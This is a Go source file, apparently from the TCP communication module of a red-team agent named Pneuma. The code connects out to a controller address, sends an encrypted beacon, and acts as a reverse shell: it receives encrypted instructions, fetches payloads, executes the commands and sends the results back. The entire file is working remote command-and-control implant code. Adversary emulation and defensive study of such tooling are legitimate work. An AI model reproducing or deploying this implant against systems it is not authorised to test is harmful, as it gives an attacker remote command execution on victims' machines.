package sockets

import (
	"bufio"
	"bytes"
	"encoding/json"
	"github.com/preludeorg/pneuma/commands"
	"github.com/preludeorg/pneuma/util"
	"io"
	"log"
	"net"
	"os"
	"strings"
)

type TCP struct {}

func init() {
	CommunicationChannels["tcp"] = TCP{}
}

func (contact TCP) Communicate(agent *util.AgentConfig, beacon Beacon) {
	for {
		conn, err := net.Dial("tcp", agent.Address)
	   	if err != nil {
	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
	   	} else {
	   		listen(conn, beacon, agent)
	   		if util.ResetFlag {
	   			ResetChan<-0
				break
			}
	   	}
	   	jitterSleep(agent.Sleep, "TCP")
	}
}

func listen(conn net.Conn, beacon Beacon, agent *util.AgentConfig) {
	//initial beacon
	bufferedSend(conn, beacon)

	//reverse-shell
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
		message := strings.TrimSpace(scanner.Text())
		respond(conn, beacon, message, agent)
		if util.ResetFlag {
			return
		}
    }
}

func respond(conn net.Conn, beacon Beacon, message string, agent *util.AgentConfig) {
	var tempB Beacon
	json.Unmarshal([]byte(util.Decrypt(message)), &tempB)
	beacon.Links = beacon.Links[:0]
	for _, link := range tempB.Links {
		var payloadPath string
		if len(link.Payload) > 0 {
			payloadPath = requestPayload(link.Payload)
		}
		response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath, agent)
		link.Response = strings.TrimSpace(response) + "\r\n"
		link.Status = status
		link.Pid = pid
		beacon.Links = append(beacon.Links, link)
	}
	pwd, _ := os.Getwd()
	beacon.Pwd = pwd
	if util.ResetFlag {
		ResetBeacon = beacon
		return
	}
	bufferedSend(conn, beacon)
}

func bufferedSend(conn net.Conn, beacon Beacon) {
	data, _ := json.Marshal(beacon)
	allData := bytes.NewReader(append(util.Encrypt(data), "\n"...))
	sendBuffer := make([]byte, 1024)
	for {
		_, err := allData.Read(sendBuffer)
		if err == io.EOF {
			return
		}
		conn.Write(sendBuffer)
	}
}